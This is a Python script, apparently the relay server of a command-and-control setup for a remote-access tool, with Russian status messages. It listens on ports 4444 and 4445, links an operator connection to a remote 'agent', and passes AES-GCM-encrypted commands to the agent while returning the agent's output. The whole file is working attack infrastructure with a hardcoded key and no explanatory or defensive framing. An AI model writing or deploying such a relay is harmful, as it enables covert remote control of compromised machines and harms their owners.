import socket, os, threading
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

KEY = bytes.fromhex("0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef")

def decrypt(data):
    nonce, ct = data[:12], data[12:]
    return AESGCM(KEY).decrypt(nonce, ct, None)

def encrypt(data):
    nonce = os.urandom(12)
    return nonce + AESGCM(KEY).encrypt(nonce, data, None)

server_nxtv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_nxtv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_nxtv.bind(('0.0.0.0', 4444))
server_nxtv.listen(1)

server_agent = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_agent.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_agent.bind(('0.0.0.0', 4445))
server_agent.listen(1)

print('[*] Облачный сервер запущен!')

agent_conn = None

def accept_agents():
    global agent_conn
    while True:
        try:
            c, a = server_agent.accept()
            agent_conn = c
            print(f"\n[+] АГЕНТ ПОДКЛЮЧЕН! Адрес: {a}")
        except Exception:
            pass

threading.Thread(target=accept_agents, daemon=True).start()

while True:
    try:
        c, a = server_nxtv.accept()
        print(f"\n[+] NXTV ПОДКЛЮЧЕН! Адрес: {a}")
        while True:
            try:
                raw = c.recv(4096)
                if not raw: break
                cmd = decrypt(raw).decode('utf-8', errors='ignore').strip()
                if agent_conn:
                    try:
                        agent_conn.send(encrypt(cmd.encode()))
                        raw_resp = agent_conn.recv(65536)
                        out = decrypt(raw_resp)
                    except Exception:
                        out = "[!] Agent disconnected".encode()
                        agent_conn = None
                else:
                    out = "[!] Agent not connected".encode()
                c.send(encrypt(out))
            except Exception:
                break
    except Exception:
        pass
